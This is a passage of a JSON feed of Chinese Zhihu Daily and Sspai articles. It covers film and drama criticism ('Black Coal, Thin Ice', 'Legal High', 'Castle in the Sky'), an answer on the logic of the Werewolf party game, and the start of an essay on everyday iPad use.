柏林电影节奉上的金熊、以及当年国内主流院线的丰厚票房的取得，艺术与商业的双赢，就是这一点的最好例证。</p>\n<p>开头部分，廖凡带队去抓犯人，犯人和警察互相像动物一样原始地搏命，这揭示了影片很重要的一层概念：人摆脱了当代道德、伦理、法律的准则束缚后，所回归到的偏向于动物属性的原始本性。在这里，这种本能表现为基于“杀与被杀”的、由动物生存欲望所带来的粗粝搏斗。而在后面的电影中，具体的表现则产生变化，进入到了对于“人发自于内心感性召唤的纯粹爱和欲”的表现。而在这个搏杀的场景中，镜头始终在中距离以固定方式拍摄，暗示了“稳固不动的大环境下人物原始性爆发的无力和虚弱”，人物虽然在原始搏命，但一切都微不足道，尽在掌控。</p>\n<p>随后，由于同事牺牲，廖凡原始的本性、作为动物的本能受到刺激，从而彻底龟缩，过场戏中也由开头的“红色”色调（冲动和激烈的颜色）经过一个穿越时间的隧道变为了大雪的“白色”色调（冷酷压抑的颜色）。</p>\n<p>而剧情上，廖凡从搏命的警察变成了浑浑噩噩的保卫科长，不再需要搏命，原始性被压抑。桂纶镁和王学兵则同样构成了本片的重要表现。桂纶镁因为自己的感情而杀死多任男友，不合当今的道德观但符合她的原始感情；王学兵作为桂纶镁的丈夫，用冰刀杀死王景春饰演的警察保护桂纶镁，同样不符合道德观、而符合他的原始感情。值得一提的是，这一处的镜头，同样采用了开头抓捕部分的模式。同时，廖凡在办案中喜欢上桂纶镁，作为警察失职，但却是他原始的个人感情所致，同样不符合价值观而符合原始性。另外，在廖凡个人生活的部分，廖凡突然向前妻求爱而被耳光推开，也对应了他原始性的被“法定离婚”所压制（被推开时镜头给到离婚证的特写）。</p>\n<p>这种原始性，是必然要被当今的道德规则所磨灭、压制住的。剧情上，最终廖凡还是选择将桂纶镁抓获。而在隐喻体系上，全片采用了两个手法 --- 前边均有提及的“固定镜头构图法”和“红色白色，色彩象征法”。</p>\n<p>固定镜头部分，除却两处死人场景，还有一处则更加巧妙：在工厂查看尸体（桂纶镁杀死的人 -- 维护个人感情而不符合道德观的牺牲品）时，廖凡踢开一个酒瓶：镜头在台阶的上方俯拍酒瓶滚下楼梯，楼梯的扶手和楼梯的坡度是倾斜的，但镜头内的构图下借由拍摄角度，而让扶手和楼梯变成了平直纵深的 --- 内在的不平衡（人类作为动物的原始性）被外在的平衡（道德价值观）所压制掩盖。这应和着本段中查看到桂纶镁杀死的人的意义 --- 人物原始性的牺牲品。</p>\n<p>而色彩手法部分，首先，在廖凡查到尸体的时候，他先是看到来往的火车，察觉到桂纶镁隐藏尸体的办法（将碎石扔下桥到火车上，让火车送到全国各地），从而看到了“桂纶镁为了自己感情而违反社会规则”的样态。此时，镜头特写给到廖凡脚下踩到的可乐罐 --- 红色的可口可乐，被掩埋在白色的雪地中。象征感情激烈的红色、与掩盖红色而构成整体的白色，形成了对于影片主旨的恰当隐喻。</p>\n<p>随后，在影片的高潮 --- 廖凡和桂纶镁在夜晚的摩天轮上互相摊牌的段落中，这种基于色彩的红白二色隐喻手法，得到了进一步的利用，并且构成了对戏剧高潮的重要对应。在这里，白色的雪首次缺席，而桂纶镁的脸上始终映着远处旅店灯牌的红光（白日焰火旅店），以此来表现二人的私情暂时性压倒了世俗的警匪价值观和杀人伏法道德观。但随后廖凡决定抓捕，而桂纶镁脸上的红色灯牌光也随之消失 --- 人性对爱情的原始渴望，终究无法驱动廖凡去违背当代的道德体系与法律准则。</p>\n<p>结尾部分，色彩手法再次出现，并且成为了刁亦男全片最重要、也是直接对应影片标题的画龙点睛：白日焰火的隐喻。廖凡为被抓获的桂纶镁放了焰火，但焰火在白天完全被天空的白色所掩盖住。刁亦男以此隐喻来点睛主题，表现原始性最终被道德观所压制而抓捕桂纶镁的廖凡以及两人私情的破灭，堪称灵性。</p>\n<p>最后的一个镜头，廖凡疯狂的独舞，更是私情再一次被压抑后的发泄 --- 由于无法做到对自身内心的完全效忠，他所能做的，也只有这般的败犬咆哮了。并且，更加微妙的是，这个结尾，形成了对前文的隐约呼应。在担任保卫科长的段落里，廖凡曾经在此地调戏女工人、与她激情共舞，这个行为暗示了廖凡贯穿全片的心理状态：他的原始内心情欲还没有消亡殆尽，但被牢牢地禁锢，而只能以这样一种无足轻重的手段来稍作疏导。而结尾处廖凡的再次起舞，显然对此前的段落构成对照，再一次揭示了这一层表达。</p>\n<p>而更进一步的是，在这一处，刁亦男让廖凡的舞蹈失去了 --- 哪怕是工厂中年大妈 --- 的女性舞伴，而更露骨地让他的深层本质被强调了出来：他的情欲即使仍然存在，也永远无法逃脱现实法则的压制，终究只能落到“没有女伴”的虚无之中。</p>\n<p>这个结尾对于观者情绪的直接作用，以及其形成的点睛主题作用，是显而易见的。本片并不通俗的表达体系所表示的内容，完全可以在结尾处得到一种情绪化的引导揭示——当看到廖凡放出的白日焰火被天空吞没，看到廖凡的疯狂独舞，对于爱情在现实的无可奈何间磨灭的、无处着力的空虚感，都会被直观地感受到。观者的情绪，被自动触发到了与主题最为契合的状态。</p>\n<p>不需解读，排斥复杂，直达内心，正是艺术的价值。而每次观之，愈发能够感受到它，则是艺术的段位。而在电影里，我们也更能看到索伦蒂诺对于“直击情感的主题点睛引导”的反复使用。通过画面、运镜，它们直接作用于观者的心灵，让观者感受到了信息，而这种情绪化的信息又是紧密作用于主题呈现的，甚至起到了引导观众理解复杂表意体系的重要作用。</p>\n<p>电影化的表意体系的出色构建、电影化的直观情绪作用瞬间的重要点睛，二者相结合，并实现后者作为电影视听艺术下、重要且独特的表达形式的效果。做到这一切，便是一部出色电影所能呈现出的出色美感了。</p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/337741812\">阅读原文<span></span></a></div>\n</div>","link":"https://daily.zhihu.com/story/9737723"},{"title":"《Legal High》呈现的是怎样的三观？","date":"2021-07-03 23:06:24","description":"<div>\n<div>\n<div>\n<img src=\"https://pic3.zhimg.com/v2-dc945c98d4f18e4a415af4da52584e18_l.jpg?source=8673f162\"><span>刘洞宇，</span><span>在做教育 / 想写一本奇妙的书</span>\n<a href=\"https://www.zhihu.com/question/28226028/answer/87108459\" hidden>阅读原文</a>\n</div>\n<div>\n<p>反对所有简单认为古美门的三观就是强者通吃，就是「胜者正义论」的回答。这样的理解显然不得要义。</p>\n<p>要把握《Legal High》真正的三观表达，我们应该意识到：</p>\n<p>古美门展露变态好胜心、不择手段维护其连胜纪录的人格，从头至尾都没有作为编剧的「第一呈现」。他贪婪好色，爱慕虚荣，嘴炮毒辣，对豪车游艇念念不忘，以及，最重要的，对不败金身有种狂热的偏执。<strong>但要注意：他的法律人格，或者说他作为法律人的基本信仰，是在情节中刻意和这些私德分离的。流氓痞子也好，拜金主义也罢，当这个人西装革履坐上原告或被告代理律师席的时候，我们才看到了藏在香车美女崇拜背后真正古美门式的三观。 </strong></p>\n<figure><img src=\"https://pic4.zhimg.com/232b85a8e244279ff8c8ac5356044872_720w.jpg?source=8673f162\" alt=\"\"></figure><p>诚然，持续的胜仗，对古美门有着极其重要的意义。抛开「谋求委托人利益最大化」这一职业属性和他本身越养越大的身价需要，这份重要性的形成，至少还有其他来源。</p>\n<p><strong>比如家庭。</strong>从天才童星案我们得知，古美门父亲奉行家长独大的严苛教育，对儿子的异见进行过污蔑性的刁难。父子关系不和，以及随之而来同父辈权威的决裂，伴随了古美门的成长。后来的离经叛道，追求认可，偏执求胜，种种不过是这种挑战和自证的延续。</p>\n<figure><img src=\"https://pic2.zhimg.com/1b82da25de02c07683480b3ae84e1f5c_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>比如职场。</strong>三流大学毕业，律考一次通过，青云直上很快来到了号称日本第一的三木律所。在这里，急待施展拳脚的古美门遇到了老道的三木，也遇到了女强人圭子，前者亲口教导他为了赢要不惜一切，后者更是同他并肩实践并捍卫了这一守则。于是在第一季决战中三木对古美门父亲说出了下面的话：</p>\n<p>「古美门研介这位法律家，是您赋予了他生命，由我培养出来的怪物。我们是共犯。」</p>\n<figure><img src=\"https://pic4.zhimg.com/b2d0d22ed0ddc4879c1fc0651eeaa5de_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>比如仓鼠纱织。</strong>小黛在健身房也向古美门挑明了这一点：</p>\n<blockquote>我好像明白了，为什么您执着于胜诉，是因为纱织吧。（古美门愣住。）您为了胜诉，夺取了无辜孩子的性命。若是放弃对胜诉的执着，就等于是否定了自己做的事。您通过不断胜诉，在拼命摆脱自己的罪恶感。这过程，想必很艰辛吧。</blockquote>\n<p>「纱织是为胜利而牺牲」这一叙事的合法性的毁灭，古美门难以承受。这也从另一个角度佐证了古美门脱下律师外衣后的情义。</p>\n<p>因此，不停赢官司，对古美门，极端重要。<strong>但，我们同时得明白，赢在他心里也并不占有至高无上的优先级。——如此渴望打垮对手，他也却几乎无时无刻不顺服于「最高原则」——即剧名暗示的那样：legal high，游戏规则至上（而不是翻译成的胜者至上）。</strong>哪怕用出了某些钻空子的、让观众感到道德两难、甚至有些下三滥的伎俩（如暗中指使加贺兰丸，威胁关键证人，制造舆论等等），也基本没有僭越现行的律法框架。</p>\n<p><strong>在剧中，古美门是张王牌。他可以是王牌吐槽员，王牌享受家，但他首先是个王牌律师。他一切的狷介不羁都臣服于他高度自律的法律观。</strong>有趣的是，作为法律人的原初意识，却也源自他不讲情面的父亲追问的那句：</p>\n<p>「圣诞老人不存在的证据是什么」。</p>\n<figure><img src=\"https://pic4.zhimg.com/747cffb671136716a19bee516b370e1c_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>证据意识。程序正义。逻辑链。法理事实。有效性和可能性。</strong></p>\n<p><strong>这是古美门风流的底气，也是他的底线。 </strong></p>\n<p><strong>至于感情羁绊，在大部分古美门时刻，是不被正面展示的。</strong>编剧想传递的三观也大致如此。但有些悖论的是，一旦滑入彻底绝情，这个角色也随之会失去最后的温度以及所有观感上的生而为人的良知，真正沦为大贯律师等人口中的所谓赚钱机器和恶魔爪牙。这样观众买单度不会高。所以最后，受了某人的影响（服部语），古美门也接下了没胜算的官司，有了那段激情澎湃的演说，孤注一掷帮村民对抗仙羽化学这个庞然大物。古美门形象也就此得以救赎。</p>\n<p>当然，需要强调：古美门从来都有温情，只是很隐晦，不易激发，而且稍纵即逝。其威力远不及钞票癖和求胜心来得生猛。而另一面，他的法律理性——别看他经常疯癫——大部分时间都处在主导之位。</p>\n<p><strong>「法内逍遥，也不冷血。人谋己利，天经地义。」 </strong></p>\n<figure><img src=\"https://pic1.zhimg.com/0389749fbfd4fdc8c55625fac4ed3093_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic2.zhimg.com/212b0fd4d5c48f80d2040d17f010800c_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic2.zhimg.com/ee7774a2c55fb3062ca202a03302f2a2_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic2.zhimg.com/331a2eef7879e6e468f9d9a015592917_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic2.zhimg.com/d576965e7ced672938bbcd37dc6eebcf_720w.jpg?source=8673f162\" alt=\"\"></figure><p>人本能上，会对眼前孱弱的同类产生难以遏制的同情。进而催生脱离法理的直觉上的正义感。一如初出茅庐的小黛。<strong>相反，良好的职业浸润让古美门几乎自觉地把这种可能蒙蔽双眼的原始情绪压抑到非常有限、可控的量级。</strong></p>\n<p>——两人间这一核心冲突从第一集公交让座和坪仓洗冤一案就开始了。</p>\n<p>古美门教育小黛：</p>\n<p><strong>别自恋了。我们不是神，只是区区一介律师，我们哪里知道真相。不要一厢情愿，再挥洒自己居高临下的同情了。成文法本身，才是我们该视为珍宝之物。</strong></p>\n<p>这是他的自我解说。</p>\n<p>他还觉得，人的善恶不能被简单定义。心性不定，意气用事，天真以为看到的就是全部事实，这不过是晨间剧女主角的低幼思维。「你就认为正义只存在于特摄英雄剧和《少年 JUMP》中吧。」<strong>看到卧病的老人，可爱的童星，恩爱的模范夫妻，操劳酱油家业的小儿子，就以为他们是善的，值得保护的。——却全然忘了人的私欲和复杂性。</strong></p>\n<p>这也是他的自我解说。</p>\n<p>小黛抱怨古美门冷漠贪婪没有人味儿的时候。</p>\n<p>「我总觉得，他应该是仔细考虑过的。」服部却如此应答。</p>\n<figure><img src=\"https://pic4.zhimg.com/04ba3f28f17fc3de2c95b5fcaede9fc4_720w.jpg?source=8673f162\" alt=\"\"></figure><p>这种「考虑」，某种意义上，是在推动剧情，为古美门的人情味做下旁证。<strong>但我们已知，在正义得失上，古美门从不屑、也深知做不出对账式的利弊权衡（利益得失倒是算得很精。当然了：在正义无法计量和掌控时，钱就是规则下的全部猎物）。</strong><strong>所谓深思熟虑，更好的解读是「一种法理上的 judgment」。</strong></p>\n<p>如在光照权案中，古美门告诉小黛，在你看不到的地方，说不定这样的大公司、大企业、这个你深恶痛绝的体制养活了不少人。<strong>他们的生计和利益，又算不算正义？</strong>——这是古美门正义观下必然出现的逻辑假设。他自然没心思考察究竟有多少寺田工务店、又有多少寺田朋子女士。法才是一切的天平和算计。而这一逻辑在议员富坚案中也得以印证：政客也不过是社会机器运转下的一颗棋子，他罄竹难书，但他必不可少。又何来憎恶？<strong>——所以呀，我们只需确认：此人法内之权利同样值得捍卫，同样神圣不可侵犯。 </strong></p>\n<figure><img src=\"https://pic4.zhimg.com/c9699799ec2952421fac97e76fff71ea_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>人类劣迹斑斑。</strong><strong>没有人全知全能，知晓一切。</strong></p>\n<p><strong>作为一介法律人，抱持先入为主的爱或仇恨，只会践踏正义。</strong></p>\n<p><strong>冷静地推理，冷静地遵守游戏规则，即使万恶之人也赐予他应得的屏障，不让他任何恶行缺失法律的注脚。这就是至善了。</strong></p>\n<p><strong>至于，在框架内行事的时候，我们能投机取巧、收获些身外之物，那可再好不过啦。 </strong></p>\n<p>古美门可能是个「落后就是恶」的社会达尔文主义者，可能是个沉陷于物质瘾的极端精英主义者，也可能是个贪念虚名的道德虚无主义和投机主义者。这些身份我都不否认。</p>\n<p><strong>但他的第一身份，一定是个王牌法律人。 </strong></p>\n<figure><img src=\"https://pic1.zhimg.com/23fab90c5993b9de7dedbae5162e2efc_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/61c7e8e1685b1516b1690837584d61f8_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/c679cc5fc85cdf7be1afea10725dd6f6_720w.jpg?source=8673f162\" alt=\"\"></figure><p>以上です。</p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/28226028\">阅读原文<span></span></a></div>\n</div>","link":"https://daily.zhihu.com/story/9737696"},{"title":"如何评价宫崎骏的动画《天空之城》？","date":"2021-07-03 23:06:15","description":"<div>\n<div>\n<div>\n<img src=\"https://pic4.zhimg.com/d9d48964e_l.jpg?source=8673f162\"><span>叶佳桐，</span><span>怪物总渴望着遇见同类 那么 你是我的同类么？</span>\n<a href=\"https://www.zhihu.com/question/57086002/answer/1015977068\" hidden>阅读原文</a>\n</div>\n<div>\n<p>1985 年，吉卜力工作室成立。在《风之谷》获得成功后，整个日本的动画观众都在期待宫崎骏监督的下一部作品究竟会是什么。还会是和自然有关的主题么？这次会走的更深更远么？还会出现和娜乌西卡一样可爱的主角么？倍受期待的宫崎骏监督交出了一份出人意料的答卷——《天空之城》一部专门为孩子们制作的复古漫画般的电影。</p>\n<p>古老帝国拉比达是一座漂浮在空中的巨大的机器岛，传说那里已经无人居住，蕴藏着巨大的财富。因此，无论军方还是海盗，都在找寻着这座传说中的飞行岛。</p>\n<p>矿工帕克这天偶遇拉比达继承人希达，两人一见如故。因为希达身上有找寻拉比达帝国的重要物件飞行石，军方和海盗两帮人马都在追杀希达。帕克带着希达一起逃亡，最终都没有逃出军方的手中，希达被军队掳走了。</p>\n<p>为救朋友，帕克只能选择与海盗合作。帕克与海盗成功救出了希达，同时，他们也发现了军方的邪恶计划。为了阻止军方邪恶计划的实施，他们和海盗一起踏上了寻找拉比达之旅。</p>\n<p>在上映之时，《天空之城》并没有获得日本本土观众们的青睐。在 SF 动画风潮席卷日本的 80 年代中期，《天空之城》被看做是过时的作品。因此票房也并不理想，分账收入只有 5.83 亿。算得上吉卜力工作室出品的动画中数一数二的低票房。到了 80 年代末，随着宫崎骏监督个人地位的提升和复古未来主义风潮的影响，《天空之城》的口碑才得以扭转。不过根据发行商东宝那边的数据来看，上映之时《天空之城》的观众满意度高达 97.7% ，观影人群覆盖了各个年龄层。这在当时的动画市场还是比较少见的。作为吉卜力工作室成立后的第一部动画，《天空之城》开启了吉卜力老少咸宜合家欢的路线。</p>\n<p>1984 年，宫崎骏监督的《风之谷》获得了巨大的成功，关于现代工业文明破坏自然这一问题的讨论一时层出不穷。《风之谷》赚来的钱原本计划用在高畑勋监督预备筹拍的纪录片《柳川堀割物语》上。但因为《柳川堀割物语》在拍摄初期便就出现了资金不足的情况，铃木敏夫这才找来了宫崎骏，请他再拍一部动画电影以作资金周转之用。起初，德间书店希望能趁热打铁，推出《风之谷》的续集，但宫崎骏监督却拒绝了这个提议。转而制作起了以小学生为受众群体的古典冒险动作剧《天空之城》。某种角度来看，这也算的上是宫崎骏对当时动画市场的一种抗争。上世纪八十年代被普遍认知为日本动画的黄金年代，在这一阶段，以高年龄层为目标受众的动画大行其道，SF 动画与萝卜动画是当时的主流，总的来说是一个“宅”味儿浓厚的年代。宫崎骏监督却反其道而行，将受众年龄向下开发，把真情与坦诚——这些不甚时髦的“真善美”塞到了观众的面前。他说：“我们不能将动画作品当成是负面的娱乐，也不能让它在多样化的面相中迷失了方向。动画本就该是属于孩子们的东西，是真正为儿童所创造，但也足可供成年人鉴赏。”不过这也只是宫崎骏监督的一家之言，可以说，正是因为有人创造着给孩子看的动画，有人创造着给大人看的动画，我们这些阿宅才可以享受到各种风格的作品。不同思想的碰撞带来了百花齐放的盛况，这怎么想都是一件好事。</p>\n<p>《天空之城》日语原名《天空の城ラピュタ》。ラピュタ（ laputa ）来源于著名小说《格列佛游记》中漂浮在空中的王国—拉普塔。不过宫崎骏监督并没有读过这本小说，只是看过简介，他也并不觉得着里面的剧情有多么的吸引人，甚至连拉普塔的名字也没记住。单纯是为了让企划书增添一点说服力，才借鉴了《格列佛游记》中的这个设定。当时，吉卜力工作室还考虑过「空中城の虜（天空之城的俘虏）」「空とぶ宝島（在天空漂浮的宝岛）」「飛行帝国」「空中魔城」「戦国魔城」等多个副标题，不过最终都没有得到采用。另外，由于 laputa 在西班牙语中有妓女的意思，所以海外版的《天空之城》直接翻译成了《Castle in the Sky》。算是个没有什么用的豆知识。</p>\n<p>在考虑制作《未来少年柯南》的续篇时，宫崎骏曾向 NHK 提出过一个男女主角围绕着神秘吊坠环游世界惩奸除恶的企划—《未来少年柯南 2：海底世界一周》。这份没被采用的企划就是今天《天空之城》的原型。学生时代的宫崎骏写过不少木偶剧剧本，女主角希达的名字就来源于一个以精神病院为舞台的故事。男主角“巴斯”同样是他学生时期所构思的一名船员角色。整个《天空之城》的剧情，都源自监督小学时代的幻想。NHK 后来做了一件特别打脸的事儿，《天空之城》成功后，NHK 拿着《海底世界一周》的企划找到了 GAINAX ，要求宅社照着《天空之城》做出一部 TV 动画来。最后的成品大家也很熟悉，它就是著名的《蓝宝石之谜》。在最初的计划里，《蓝宝石之谜》的主角被设定成老婆婆和小孩的组合。因为实在太像《天空之城》了，庵野秀明监督只好采取迂回政策，在尽可能满足 NHK 要求的同时又不断破坏他们的要求，在采访中他直言道：“《蓝宝石之谜》结束的时候我已经完全崩溃了。”不过这种崩溃也是诸多因素叠加在一起的结果（比如庵野秀明其实是因为前监督跑路临时接手《蓝宝石之谜》的监督工作，再比如《飞跃巅峰》和《蓝宝石之谜》接连大赤字）不能只让 NHK 背锅。顺便一提，庵野秀明对《天空之城》的评价并不高，他还觉得《红猪》商业化的东西太多，有些做作。如果有感兴趣的观众姥爷可以去搜索一下庵野秀明和宫崎骏的相关采访，这两位业界大佬在采访里总是针锋相对，可一见了面，气氛就变得其乐融融。这大概也算得上是一种反差萌吧。除了《蓝宝石之迷》，据说世界名作剧场中第 20 作《七海的堤可》也是根据这一废弃企划改编而成。在 roman album《天空之城》一书中，还有着大反派穆斯卡其实是雷普（《未来少年》柯南中的反派）先祖的设定。</p>\n<p>在制作之初，制作人高畑勋对监督说：既然要做的是以工业革命时代为背景的动画，还是去英国看一看比较好。就这样，宫崎骏监督开始了他的旅行。他看到了海岸边的苹果花，看到了威尔士的煤矿区。故事的背景就这样一点一滴的在他的脑海中凝结成形。这里有一件比较有趣的小事，宫崎骏监督在决定将溪谷作为故事的地理背景时并没有考证过威尔士的矿区到底是不是露天开采，只是单纯的觉得这样画会比较有趣。回到日本后，他把画拿给了押井守，押井守看后赞叹到：原来世界上居然还有这样的地方啊。在确认了这个设定真的能把人唬住之后，宫崎骏心满意足，开始了动画的制作。</p>\n<p>《天空之城》中的角色都有着鲜明的的性格特征，论起前后反差最大，戏剧性最强的，非朵拉莫属。这位刀子嘴豆腐心坚强果敢的女海贼的原型是宫崎骏监督的母亲。1983 年，母亲宫崎美子的离世让监督受到了巨大的打击。在《吉卜力的教科书天空之城》中，宫崎骏的弟弟宮崎至朗写下了这样一段话：在试映会结束后，我就明白了，哥哥是在通过影像向母亲饯别，虽然笨拙，但竭尽全力。在纪录片《映画大师宫崎骏创作的秘密》中，监督这样形容自己的母亲：“心里想对你好，嘴上的话却十分严厉，典型的刀子嘴豆腐心。”他在无数的作品中写下对母亲的怀念之情，却从不点明主题。按照铃木敏夫的说法，自己创造出的角色是母亲的投影这种事儿多多会令人不好意思，也许这便是他不向他人提起的理由吧。</p>\n<p>不可不提的还有久石让的配乐和那首已经被奉为经典的《君をのせて》，随便打开一个音乐软件搜索“天空之城”，就能找到这首主题曲的各种变奏。考虑到这次要做的是一个古典冒险动作动画，宫崎骏打算找来当时颇有名气的音乐家宇崎竜童来负责相关的工作。宫崎骏甚至还考虑过不放音乐的选择。不过身为制作人的高畑勋却认为继续和久石让合作会比较好。在之前的中古放映机中也提到过，高畑勋先生在当监督的时候虽然一拖再拖，但作制作人时却非常严谨。可以说，宫崎骏和久石让这对黄金搭档能够牵手成功离不开高畑勋的努力和付出。没有了他，吉卜力工作室绝不会取得今天这样的成绩。在今后的中古放映机中，我们会专门出去一期视频详细的介绍高畑勋监督的伟大之处，毕竟无论对于吉卜力工作室，还是日本动画界，他都是一位太重要的人了。</p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/57086002\">阅读原文<span></span></a></div>\n</div>","link":"https://daily.zhihu.com/story/9737716"},{"title":"狼人杀逻辑性真的很强吗？","date":"2021-07-03 23:06:09","description":"<div>\n<div>\n<div>\n<img src=\"https://pic4.zhimg.com/da8e974dc_l.jpg?source=8673f162\"><span>知乎用户，</span><span>生如蝼蚁当立鸿鹄之志，命薄如纸应有不屈之心！</span>\n<a href=\"https://www.zhihu.com/question/47863187/answer/1024928467\" hidden>阅读原文</a>\n</div>\n<div>\n<p>比大部分游戏逻辑性要强一些。</p>\n<p>因为这个游戏的规则就是你死我活、非输即赢的游戏。</p>\n<p>这个游戏除了几个基本的游戏规则是硬逻辑，100%成立，比如一局网杀 12 个人，有 4 个平民、四个狼，4 个神，每个神都有各自的技能，狼可以每晚刀一人。</p>\n<p>除此之外其他的都是概率逻辑，比如上警必有对跳，要是没狼出来对跳，怂狼局神职们除了守卫肯定是要摆名身份裸打的，加上预言家 3 轮验人，狼根本没有生存空间。所以上警出现对跳的概率是 95%以上。那么当首跳预言家后，一个比较硬的逻辑就是至少还会有一个对跳。但也有可能这局就是怂狼局，那我们能说一般上警开对跳是没有逻辑的吗？当然不能。</p>\n<p>再比如女巫首晚不被首刀，大概率会捞人。因为捞人的收益最大，毕竟狼自刀的概率比狼杀好人的概率低多了。所以女巫大概率会捞起一个好人，如果捞起个神职就更好了。但如果不捞人，狼再刀走一个神职基本这局狼的赢面就奠定了。但是偏偏有女巫不仅首夜不救人，还要盲毒一个走。那认定女巫会首夜捞人能不能作为一个逻辑，当然可以。</p>\n<p>毕竟除了游戏硬规则几个铁逻辑，没有其他逻辑是 100%成立的。但是团队还是要在这个规则下为了胜利而努力。而赢得游戏的基本方式，就是通过发言。</p>\n<p>而有些说法正反都成立，几乎是 55 开。比如大家都认定对跳发言好的预言家的概率高，实际一个人发言能力跟他摸的是预言家还是狼没有任何关系，一个发言能力差的预言家很可能被认定为狼首推出局。这个时候狼队可以根据发言来把焦点引到真的预言家发言差，没视角、爆点多上面来，从而煽动平民和其他神职把真的预言家抗推出局。</p>\n<p>这个时候一个优秀的选手就能在众多的逻辑中选择出最有利于自己团队胜利的一些来重点表述，带节奏。比如，如果是狼大概率是要抗推其他非狼的平民，这应该是个主逻辑，但是不是疯狂点狼坑的人（找抗推）就是狼呢？</p>\n<p>还是要区分考虑，这时候你就要参考场上形势来具体判断了，这个人到底是个尽职的强神、还是个想挡刀的平民，还是打坑位抗推的冲锋狼？</p>\n<p>狼人杀常用的逻辑未必都是 100%成立，但是根据情形选用哪些信息，哪些逻辑为己所用，则是一个十分考验人的事情。</p>\n<p>至于题主说的狼可以反其道而行之，就我狼人杀的经验而言，其实难度还是很大的。因为狼人在取胜目标和假穿身份时，需要有意的吃掉一些信息，然后找出有利于自己的逻辑来表述，这中间大部分人会出现停顿、拖时间、底气不足、拿一些概率非常小的逻辑在抗推人，即使在狼王区也是如此。</p>\n<p>你就想想，为什么极少有人能骗过测谎仪。</p>\n<p>所以，我觉得狼人杀是一项逻辑性比较强的游戏。这个逻辑性，不仅仅指游戏规律有 100%成立的，有大概率成立的，有 55 开的，有概率较小的，还包括通过发言判断目的、判断共边关系、判断身份、通过形式改变策略进而相互言语间不动声色的沟通的辨识能力、判断能力、沟通能力在内。</p>\n<p>但每个游戏者如何运用这些规则为己所用，尤其对于狼人而言，有时发言多达 10 轮，每轮都要吃信息，又要故意隐瞒信息，还不能言语前后矛盾，还要达成保护同伴抗推好人的目的，本身就是一个逻辑性很强的事情。</p>\n<p>狼人杀的游戏规则设定就是 55 开的游戏，压倒性获胜是小概率事件，大部分胜败都在一推或一刀之间。</p>\n<p>激励的游戏规则，每个不同参与者的不同表现，使得该游戏被越来越多的人喜欢。</p>\n<p>说狼人杀逻辑性不强的，可能还没有真正玩透这个游戏。</p>\n<p>反问一句，如果这个游戏不是靠逻辑判断来支撑，难道是靠胡言乱语取胜吗？</p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/47863187\">阅读原文<span></span></a></div>\n</div>","link":"https://daily.zhihu.com/story/9737763"},{"title":"如何真实描绘 iPad 的现状？聊聊我的使用场景和思考","date":"2021-07-03 07:08:13","description":"\n<h3><strong>Matrix 首页推荐</strong></h3>\n<p><a href=\"https://sspai.com/matrix\">Matrix</a> 是少数派的写作社区，我们主张分享真实的产品体验，有实用价值的经验与思考。我们会不定期挑选 Matrix 最优质的文章，展示来自用户的最真实的体验和观点。</p>\n<p>文章代表作者个人观点，少数派仅对标题和排版略作修改。</p>\n<hr>\n<p>很多人在聊起 iPad 的时候，都在不留余力地吐槽「它不可以做啥」，而鲜有人分享「它到底真的能做什么」。我始终认为决定一个产品最终能否走得更远和被用户接受，取决于大家充分了解 iPad 的核心用户都用 iPad 做了什么事情，这才能帮助用户找到适合自己的使用场景。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/27/3e4db327a19bae813391929ddb080ef2.jpeg\"></figure><p>这就是我想写这篇文章的目的，一方面我想聊聊我在用 iPad 做什么，另一方面聊聊离我理想的 iPad 还欠缺什么。我希望能有更多 iPad 用户分享使用体验和独特用法，让大家在看到 iPad 不足的同时，也有更多机会看到它有价值的一面。</p>\n<h2>一 . 我在 iPad 上做过的尝试</h2>\n<p>我算是一个 iPad 的老用户，iPad 的每个新形态我都尝试过。在过去的很长时间里，iPad 对我而言是个「吃灰居多，偶尔有点作用」的工具，除了 iPad 固有的问题外，自己的能力也并不足以让我充分利用 iPad。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/27/db99c398fd6d31878bbc96fed0129cbe.jpeg\"></figure><p>从去年底到现在，iPad 在我日常工作中的使用比例越来越高，甚至在最近几个月成为了我的核心设备，超过了我使用 Mac 的时间。</p>\n<p>主要原因有两点：随着更多 iPad 用户的经验分享和自身知识面的积累，我能够更好地解决在 iPad 上遇到的问题；其次是工作内容的变化让我不再需要依靠功能复杂的软件，这让我拥有更多选择设备的空间。</p>\n<h2>二 . 我日常用 iPad 做些什么</h2>\n<h3>1. 产品规划和协作</h3>\n<p>我是一个 B 端的产品经理，日常工作是规划现有产品迭代，根据需求制定相应的文档和原型。工作内容不复杂，也不依靠大型软件。</p>\n<p>我主要在 iPad 上使用云端协作类的软件，例如腾讯文档、Notion、Figma 之类的，因为各方的进度和问题都是需要实时同步，所以协作类软件是当前最好的选择。这些软件在 iPad 上都有着非常好的适配，你不需要担心它和电脑上有什么区别。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/27/81dae0e6a7b3d38c1e09f0c1f82e6c16.jpg\"></figure><p>像 PPT 和 Word 文档在微软的努力下已经有很好的体验，配合妙控键盘的触摸板，只要不是非常复杂和格式奇乱的文档，我都可以轻松处理，哪怕是 PPT 的视觉设计也不是太大的问题。不过 Excel 仍然只能满足看和简单修改，几乎无法进行数据的处理。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/27/2ff694c67381e8f60e55638c7088ccab.jpg\"></figure><p>像思考类的软件，头脑风暴的时候可以用 Goodnote 等白板软件，也可以用 Xmind 这类思维导图软件，体验都很不错。最近 Figma 上线了 